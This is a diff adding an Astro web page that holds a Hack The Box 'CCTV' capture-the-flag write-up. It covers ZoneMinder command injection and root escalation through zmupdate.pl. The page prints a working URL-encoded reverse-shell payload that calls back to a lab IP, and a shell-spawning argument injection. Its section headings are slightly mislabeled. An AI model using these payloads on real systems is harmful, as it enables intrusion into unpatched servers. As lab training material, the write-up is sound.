@@ -1,0 +1,257 @@
+---
+import Layout from "@/layouts/Layout.astro";
+---
+
+<Layout title="CCTV — HTB Writeup">
+  <main class="max-w-3xl mx-auto py-16 text-[var(--white)]">
+    <a
+      href="/#writeups"
+      class="inline-flex items-center gap-2 text-sm text-[var(--white-icon)] hover:text-white transition-colors mb-8"
+    >
+      <svg
+        xmlns="http://www.w3.org/2000/svg"
+        viewBox="0 0 24 24"
+        fill="currentColor"
+        class="size-4"
+      >
+        <path d="M7.82843 10.9999H20V12.9999H7.82843L13.1924 18.3638L11.7782 19.778L4 11.9999L11.7782 4.22168L13.1924 5.63589L7.82843 10.9999Z"
+        ></path>
+      </svg>
+      Back to writeups
+    </a>
+
+    <header class="mb-10">
+      <div class="flex flex-wrap items-center gap-3 mb-3 text-sm">
+        <span class="px-3 py-1 rounded-full border border-1 border-[var(--white-icon-tr)] bg-[#1414149c] text-[var(--sec)]">
+          Hack The Box
+        </span>
+        <span class="px-3 py-1 rounded-full border border-1 border-[var(--white-icon-tr)] bg-[#1414149c] text-[var(--white-icon)]">
+          Machine
+        </span>
+        <span class="px-3 py-1 rounded-full border border-1 border-[var(--white-icon-tr)] bg-[#1414149c] text-[#A9FF5B]">
+          Easy
+        </span>
+        <span class="text-[var(--white-icon)]">Oct 2026</span>
+      </div>
+      <h1 class="text-4xl md:text-5xl font-semibold mb-3">CCTV</h1>
+      <p class="text-[var(--white-icon)]">
+        Exploitation of the CCTV machine from Hack The Box — Season 10.
+      </p>
+    </header>
+
+    <figure class="mb-10">
+      <img
+        src="/images/cctv/cover.png"
+        alt="CCTV cover"
+        class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
+      />
+    </figure>
+
+    <article class="writeup space-y-5">
+      <p>
+        This writeup documents the exploitation of the CCTV machine from Hack
+        The Box — Season 10.
+      </p>
+      <p>Grab a coffee ☕ and let’s dive in.</p>
+
+      <figure class="flex justify-center my-8">
+        <img src="/images/cctv/divider1.gif" alt="" class="rounded-xl" width="220" />
+      </figure>
+
+      <h2>Reconnaissance &amp; Port Scanning</h2>
+      <p>
+        To begin the assessment, I ran a full TCP port scan on the target
+        <code>(10.10.11.10)</code> using
+        <code>nmap</code> with service version detection:
+      </p>
+      <pre><code>sudo nmap -sV -sC -p- 10.10.11.10</code></pre>
+      <p>
+        Once the scan was complete, I identified two open services running on
+        the target:
+      </p>
+      <pre><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
+8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</code></pre>
+      <ul class="list-disc list-inside space-y-1">
+        <li><strong>SSH (port 22)</strong></li>
+        <li><strong>HTTP (port 8080)</strong> — hosting a <strong>ZoneMinder</strong> server</li>
+      </ul>
+
+      <figure class="flex justify-center my-8">
+        <img src="/images/cctv/divider2.gif" alt="" class="rounded-xl" width="498" />
+      </figure>
+
+      <h2>Foothold → CVE-2022–29254</h2>
+      <p>
+        Since there was a ZoneMinder server running, this was the first thing I
+        decided to dig into. I searched for known public exploits and came
+        across <strong>CVE-2022–29254</strong> — a command injection
+        vulnerability affecting ZoneMinder versions <strong>1.36.32 and
+        prior</strong>.
+      </p>
+      <figure>
+        <img
+          src="/images/cctv/versions.png"
+          alt="ZoneMinder versions"
+          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
+        />
+        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
+          ZoneMinder versions affected by CVE-2022–29254
+        </figcaption>
+      </figure>
+      <p>
+        Looking into the version in use and the public exploits available, the
+        vulnerable endpoint was identified as:
+      </p>
+      <pre><code>/zm/index.php?view=package&amp;order%5B%5D=</code></pre>
+      <p>
+        This endpoint passes user input directly to
+        <code>shell_exec()</code> without any sanitization, leading to command
+        injection as the <code>www-data</code> user.
+      </p>
+
+      <h2>Command Injection → Zombie Process Command Execution</h2>
+      <p>
+        Then I intercepted the request using <strong>Burp Suite</strong> and
+        sent it to <strong>Repeater</strong>. At first, I tried a simple
+        <code>sleep 5</code> payload to confirm the delay — and it worked as
+        expected.
+      </p>
+      <figure>
+        <img
+          src="/images/cctv/cmdi.png"
+          alt="Command injection in Burp Suite"
+          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
+        />
+        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
+          Command injection confirmed through Burp Suite
+        </figcaption>
+      </figure>
+      <p>
+        Since the parameter is received as an array, I URL-encoded the
+        brackets:
+      </p>
+      <pre><code>order%5B%5D=%60sleep+5%60</code></pre>
+      <p>
+        This confirmed the command injection vulnerability. From here, I
+        upgraded the exploit to obtain a proper reverse shell:
+      </p>
+      <pre><code>order%5B%5D=%60bash+-c+'exec+bash+-i+%26%3E+/dev/tcp/10.10.14.100/9001+%26%3E+1'%60</code></pre>
+      <p>And just like that — a foothold was secured. 🎉</p>
+
+      <h2>PrivEsc → Zombie Process Command Execution</h2>
+      <p>
+        Once on the machine, I started enumerating for privilege escalation
+        vectors. Running <code>getcap</code> on the system revealed something
+        very interesting:
+      </p>
+      <pre><code>www-data@cctv:/usr/bin$ getcap -r / 2&gt;/dev/null
+/usr/bin/zmupdate.pl = cap_setuid+ep</code></pre>
+      <p>
+        The <code>zmupdate.pl</code> binary from ZoneMinder had the
+        <code>cap_setuid</code> capability set, which allows it to change its
+        effective user ID — a direct path to privilege escalation.
+      </p>
+      <p>
+        After reviewing the script and checking the available options, I found
+        a flag that allows executing a custom database user:
+      </p>
+      <pre><code>sudo -u root /usr/bin/zmupdate.pl --user='; /bin/bash -c /bin/bash;' --pass='' --version=1.36.32</code></pre>
+      <p>
+        And with that — we’re root! 🚀 Now it’s time to grab the flags.
+      </p>
+      <figure>
+        <img
+          src="/images/cctv/root.png"
+          alt="Root flags"
+          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
+        />
+        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
+          Both flags captured as root
+        </figcaption>
+      </figure>
+      <p>Machine pwned — <strong>CCTV</strong> complete. ✅</p>
+
+      <figure class="flex justify-center my-8">
+        <img src="/images/cctv/divider3.gif" alt="" class="rounded-xl" width="480" />
+      </figure>
+
+      <p>Thanks for the read! 🩶</p>
+    </article>
+
+    <div class="mt-12 pt-8 border-t border-[#ffffff10] flex justify-between items-center">
+      <a
+        href="/#writeups"
+        class="inline-flex items-center gap-2 text-sm text-[var(--white-icon)] hover:text-white transition-colors"
+      >
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="size-4">
+          <path d="M7.82843 10.9999H20V12.9999H7.82843L13.1924 18.3638L11.7782 19.778L4 11.9999L11.7782 4.22168L13.1924 5.63589L7.82843 10.9999Z"></path>
+        </svg>
+        Back to writeups
+      </a>
+      <a
+        href="https://medium.com/@ahmed.gamal113296/cctv-htb-writeup-7cedfa063f3e"
+        target="_blank"
+        rel="noopener noreferrer"
+        class="inline-flex items-center gap-2 text-sm text-[var(--sec)] hover:text-white transition-colors"
+      >
+        Read on Medium
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="size-4">
+          <path d="M16.0037 9.41421L7.39712 18.0208L5.98291 16.6066L14.5895 8H7.00373V6H18.0037V17H16.0037V9.41421Z" />
+        </svg>
+      </a>
+    </div>
+  </main>
+</Layout>
+
+<style>
+  .writeup {
+    font-size: 1.05rem;
+    line-height: 1.8;
+    color: var(--white);
+  }
+
+  .writeup h2 {
+    font-size: 1.75rem;
+    font-weight: 600;
+    color: var(--white);
+    padding-top: 1.5rem;
+  }
+
+  .writeup strong {
+    color: #fff;
+  }
+
+  .writeup code {
+    background: #1414149c;
+    border: 1px solid var(--white-icon-tr);
+    border-radius: 0.4rem;
+    padding: 0.1rem 0.4rem;
+    font-size: 0.85em;
+    color: var(--sec);
+    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+    word-break: break-all;
+  }
+
+  .writeup pre {
+    background: #1414149c;
+    border: 1px solid var(--white-icon-tr);
+    border-radius: 1rem;
+    padding: 1rem 1.25rem;
+    overflow-x: auto;
+  }
+
+  .writeup pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: #dfdfdf;
+    font-size: 0.9rem;
+    line-height: 1.7;
+    word-break: normal;
+  }
+
+  .writeup figure img {
+    display: block;
+  }
+</style>
